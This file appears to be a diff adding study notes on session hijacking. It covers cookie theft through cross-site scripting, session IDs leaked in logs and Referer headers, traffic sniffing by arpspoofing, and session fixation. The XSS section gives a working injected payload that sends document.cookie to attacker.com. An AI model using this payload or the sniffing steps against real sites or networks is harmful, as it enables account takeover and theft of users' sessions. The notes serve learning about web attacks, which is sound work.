@@ -1,0 +1,65 @@
+Overview:
+	Multiple attack vectors for session hijacking
+	Many attacks exploit disclosure of the session ID
+	Define the session ID the victim will use 
+
+Hijacking Cookies with Cross-Site Scripting:
+	One of the most prominent session hijacking attacks
+
+	Give a URL who is already authenticated. The URL will contain
+	..../Search?searchTerm=');
+	var img=document.createElement("img");
+	img.src="http://attacker.com/?cookies="+document.cookie;
+	document.body.appendChild(img);//
+
+	The very beginning part of the appended URL is used to escape out of the
+	javascript being hosted on the page. The second part of the attack is to 
+	create an image that will be loaded when a user clicks the link. The 
+	source of the image will be processed like normal. In this case, however,
+	part of the image source asks for the cookies of the current document.
+	Which means the user sends his own cookies when he tries to load the fake
+	image, so the attacker now has them.
+
+	Because we've already escaped out of the .val('') query at the beginning,
+	we add some comment characters at the end to invalidate the "real" end
+	of the .val instruction. The source of the page would look something like
+
+	<script>
+	...
+	$('#searchTerm').val('');var img=document.createElement("img");
+	img.src="http://attacker.com/?cookies="+document.cookie;
+	document.body.appendChild(img);//');
+	</script>
+
+Exposed Cookies in Logs:
+	Some tools for developers will include session cookies in error logs when
+	some error happens on the webpage. If the logs are publicly exposed, then
+	the attacker gets all kinds of interesting data about the session that 
+	caused the exception.
+
+Leaking URL Persisted Sessions in the Refferer header
+	If you use a session ID in the URL, that URL will be included in the 
+	HTTP request to another website if you follow a link from the host. 
+
+	Example:
+	You are authenticated on website A. Somewhere on website A there is a link
+	to go to website B. If you can see traffic flowing to website B, then you
+	can inspect the packet and look at the Refferer Header in the HTTP request.
+	This header will include the session ID of the user for website A
+
+Session Sniffing:
+	However, if you do have the ability to listen to and sniff traffic between
+	domains on a network, you can still get the session cookie when it's not
+	even part of the URL. 
+
+	One easy way to do this is to arpspoof the router, watch everyone's traffic,
+	and look at Refferer headers and Cookies sent as part of an HTTP request.
+	You will get many session IDs via cookies and URLs of unsuspecting victims.
+
+Session Fixation:
+	Give a user a session ID. Let the user log in and do some sort of 
+	authenticated action. Once this happens, you can use the exact same 
+	session ID on your own browser and you will essentially be logged in as 
+	the victim user.
+
+	
